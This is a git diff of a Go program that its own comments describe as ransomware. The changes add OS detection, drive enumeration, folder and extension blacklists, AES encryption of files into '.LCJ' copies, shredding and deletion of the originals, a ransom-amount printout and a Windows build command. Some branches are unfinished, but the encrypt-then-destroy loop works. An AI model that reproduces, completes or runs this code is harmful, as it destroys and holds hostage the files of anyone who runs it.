@@ -11,8 +11,6 @@ package main
 // send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and a e-mail
 // and send with the message the encryption key
 
-
-
 import (
 	"crypto/aes"
 	"crypto/cipher"
@@ -36,12 +34,96 @@ import (
 
 var key []byte
 var file_count int
-var saved_ext = [...]string{"LCJ", "dll", "exe", "iso", "img", "msi", "deb", "ini",}
+var all_files []string
+var operating_system string
+var ext_blacklist = [...]string{
+	"LCJ",
+	"dll",
+	"exe",
+	"iso",
+	"img",
+	"msi",
+	"deb",
+	"ini",
+	"sys",
+	"json",
+	"msi",
+	"msu",
+	"mst",
+	"ini",
+	"img",
+	"xml",
+}
+
+var WINDOWS_ff_blacklist = [...]string{
+	"bootmgr",
+	//"BOOTNXT",
+	"Documents and Settings",
+	"DumpStack.log",
+	"DumpStack.log.tmp",
+	//"pagefiles.sys", edode : included in ext_whitelist
+	"Program Files",
+	"Program Files (x86)",
+	"ProgramData",
+	//"swapfile.sys", edode : included in ext_whitelist
+	"Windows",
+	"System Volume Information",
+	"lost+found",
+
+	"Autodesk",
+	//"$Recycle.Bin", // lisandro : delete it ?
+	//"Recycle.Bin", // lisandro : delete it ?
+	"Desktop",
+	"Users",
+}
+var WINDOWS_ff_whitelist  = [...]string{
+	"Desktop",
+	"Users",
+}
+
+var LINUX_ff_blacklist = []string{ // lisandro : evaluate symlink 19111999 : add ...
+	"bin",
+	"boot",
+	".cache",
+	"dev",
+	"etc",
+	"lost+found",
+	"media",
+	"opt",
+	"proc",
+	"run",
+	"srv",
+	"sys",
+	"tmp",
+	"usr",
+	"var",
+}
+var LINUX_ff_whitelist = [...]string{
+	//"/root/y",
+	"/root",
+	"/home",
+	"/mnt",
+}
 
 func init() {
 	//rand.Seed not working
 	//rand.Seed(time.Now().UnixNano())
-	runtime.GOMAXPROCS(2)
+	operating_system = detect_os()
+
+}
+
+func detect_os()(string){
+	operating_sys := runtime.GOOS
+	switch operating_sys {
+	case "windows":
+		return "windows"
+	case "darwin":
+		return "mac"
+	case "linux":
+		return "linux"
+	default:
+		return "windows"
+	}
 }
 
 // ========= GENERAL =========
@@ -114,13 +196,13 @@ func (conf Conf) Dir(path string) error {
 // File overwrites a given File in the location of path
 func (conf Conf) File(path string) error {
 	for i := 0; i < conf.Times; i++ {
-		if err := overwriteFile(path, true); err != nil {
+		if err := overwrite_file(path, true); err != nil {
 			return err
 		}
 	}
 
 	if conf.Zeros {
-		if err := overwriteFile(path, false); err != nil {
+		if err := overwrite_file(path, false); err != nil {
 			return err
 		}
 	}
@@ -133,7 +215,7 @@ func (conf Conf) File(path string) error {
 	return nil
 }
 
-func overwriteFile(path string, random bool) error {
+func overwrite_file(path string, random bool) error {
 	f, err := os.OpenFile(path, os.O_WRONLY, 0)
 	if err != nil {
 		return err
@@ -231,7 +313,7 @@ func create_encryption_key() []byte {
 	return new_key
 }
 
-func check_key() {
+func encryption_key() {
 	the_key, err := ioutil.ReadFile("key") //Check to see if a key was already created
 	if err != nil {
 		key = create_encryption_key() //If not, create one
@@ -240,7 +322,7 @@ func check_key() {
 	}
 }
 
-func encryptFile(inputfile string, outputfile string) {
+func encrypt_file(inputfile string, outputfile string) {
 	b, err := ioutil.ReadFile(inputfile) //Read the target file
 	Error(err)
 	ciphertext := encrypt(key, b)
@@ -274,18 +356,149 @@ func encrypt(key, text []byte) []byte {
 
 // ========= END ENCRYPT =========
 
-func list_dir(path string)([]string){
-	searchDir := path
-	fileList := make([]string, 0)
+func AppendIfMissing(slice []string, i string) ([]string, bool) {
+	for _, ele := range slice {
+		if ele == i {
+			return slice, false
+		}
+	}
+	return append(slice, i), true
+}
+
+func a(searchDir string)([]string){
+	var fileList []string
+	var not_here []string
 	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
+		AppendIfMissing(LINUX_ff_blacklist, path)
 		fileList = append(fileList, path)
 		return err
 	})
-
 	if e != nil {
 		panic(e)
 	}
+	return not_here
+}
+
+func list_dir(path string)([]string){ // lisandro : check file ext here
+	searchDir := path
+	var fileList []string
+
+	if operating_system == "linux" {
+		e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
+			fileList = append(fileList, path)
+			return err
+		})
+		if e != nil {
+			panic(e)
+		}
+	}
+	if operating_system == "windows"{
+		e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
+			fmt.Println(searchDir)
+			return err
+		})
+		if e != nil {
+			panic(e)
+		}
+
+	}
+	/*
+		if operating_system == "windows"{
+			var disk_drives string              // edode : C:; I:; E:;
+			var base_folder_and_childs []string // edode : base_folder_and_childs are folders like "Program Files/*"; "Windows/*"
+			e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
+				cut := strings.Split(path, "\\")
+				disk_drives = cut[0]
+				base_folder := cut[1]
+				base_folder_and_childs = cut[1:]
+				for _, ff := range(WINDOWS_ff_blacklist){
+					if strings.ToLower(base_folder) == strings.ToLower(ff){
+						return filepath.SkipDir
+					}
+				}
+				z := strings.Join(base_folder_and_childs, "\\")
+				disk_drives = disk_drives + "\\" + z
+				if !is_dir(disk_drives){
+					fileList = append(fileList, disk_drives)
+				}
+				return err
+			})
+
+			if e != nil {
+				panic(e)
+			}
+		}
+	*/
+
 	return fileList
+}
+
+func getdrives() (r []string){
+	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ"{
+		f, err := os.Open(string(drive)+":\\")
+		if err == nil {
+			r = append(r, string(drive))
+			f.Close()
+		}
+	}
+	return
+}
+/*
+list only root folders, put it in []string, compare with blacklist, put non-matching keys in new []string
+ */
+
+func IOReadDir(root string) ([]string) {
+	var files []string
+	fileInfo, err := ioutil.ReadDir(root)
+	if err != nil {
+		return files
+	}
+	for _, file := range fileInfo {
+		files = append(files, file.Name())
+	}
+	return files
+}
+
+func get_all_files()([]string){
+	if operating_system == "linux"{
+		e := filepath.Walk("/", func(path string, f os.FileInfo, err error) error {
+			cut := strings.Split(path, "/")
+			base_folders := cut[1]
+			if base_folders == "media" || base_folders == "proc"{
+				return filepath.SkipDir
+			}
+			for _, blacklist := range(LINUX_ff_blacklist){
+				if strings.ToLower(base_folders) == strings.ToLower(blacklist){
+					fmt.Println(base_folders)
+
+				}
+			}
+			return err
+		})
+		if e != nil {
+			panic(e)
+		}
+	}
+	if operating_system == "windows"{
+		connected_drives := getdrives()
+		for i, drive := range(connected_drives){
+			// lisandro : to remove
+			//if drive == "C"{
+			//	continue
+			//}
+			if i == 0 {
+				all_files = list_dir(drive + ":\\")
+			} else{
+				temp := make([]string, len(all_files))
+				copy(temp, all_files)
+				all_files = list_dir(drive + ":\\")
+				for _, file := range(temp){
+					all_files = append(all_files, file)
+				}
+			}
+		}
+	}
+	return all_files
 }
 
 func remove_to_index(s []string, index int) ([]string) {
@@ -322,26 +535,10 @@ func byte_to_mega(file int64)(float64){
 	return file_size
 }
 
-func is_windows(file string)(){
-	s := strings.Split(file, "/")
-	if (s[len(s)-1] == "Windows"){
-		fileList := list_dir(file)
-		for _, f := range fileList {
-			s1 := strings.Split(f, "/")
-			if (s1[len(s)-1] == "System32"){ // 19111999 :
-
-			}
-		}
-	} else{
-		return;
-	}
-	//fmt.Println(s[len(s)-1])
-}
-
 func check_ext(file string) bool{
 	ext_split := strings.Split(file, ".")
 	file_ext  := ext_split[len(ext_split)-1:][0]
-	for _, ext := range saved_ext{
+	for _, ext := range ext_blacklist {
 		if file_ext == ext{
 			fmt.Println(file)
 			return true
@@ -358,9 +555,9 @@ func pass()(){
 	_ = ""
 }
 
-func file_list(path string)(){
-	file_tree := list_dir(path)
+func file_list(file_tree []string)() {
 
+	shredconf := Conf{Times: 2, Zeros: true, Remove: true}
 	start := time.Now()
 	for i := 1; i <= 3; i++ { // edode : 50 150 and the left ones
 		var max_size float64
@@ -390,6 +587,8 @@ func file_list(path string)(){
 			file_byte := file_to_byte(file)
 			size := byte_to_mega(file_byte)
 			if size <= max_size {
+				encrypt_file(file, file+".LCJ")
+				shredconf.Path(file)
 				file_tree = remove_to_index(file_tree, 1)
 				file_count++
 			} else {
@@ -404,14 +603,13 @@ func file_list(path string)(){
 	log.Printf("SECOND ELAPSED : %s", elapsed)
 }
 
-func main() {
-	//check_key()
-	path := "/root/y"
-	file_list(path)
+func main() { // GOOS=windows GOARCH=amd64 go build -o app-amd64.exe encryptor.go
+	encryption_key()
+	files := get_all_files()
+	file_list(files)
 	fmt.Println(file_count, ransom_amount(file_count))
 	//file_list(path, false)
 }
-
 
 
 
